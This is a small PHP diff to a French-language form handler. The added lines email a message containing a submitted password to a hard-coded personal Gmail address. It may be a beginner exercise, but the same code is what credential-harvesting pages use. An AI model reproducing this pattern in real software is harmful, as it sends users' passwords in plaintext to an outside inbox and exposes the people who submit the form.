@@ -10,6 +10,13 @@ if ($action == 'mailer') {
     $message .= 'Mot de passe : ' . PHP_EOL . $password;
     echo $message;
 
+    $from = $email;
+    $to = "enzovargaspro@gmail.com";
+    $subject = "test";
+    $headers = "De :" . $from;
+    mail($to,$subject,$message, $headers);
+    echo "L'email a été envoyé.";
+
 }
 else {
     echo '<br/><strong>Bouton non géré !</strong><br/>';
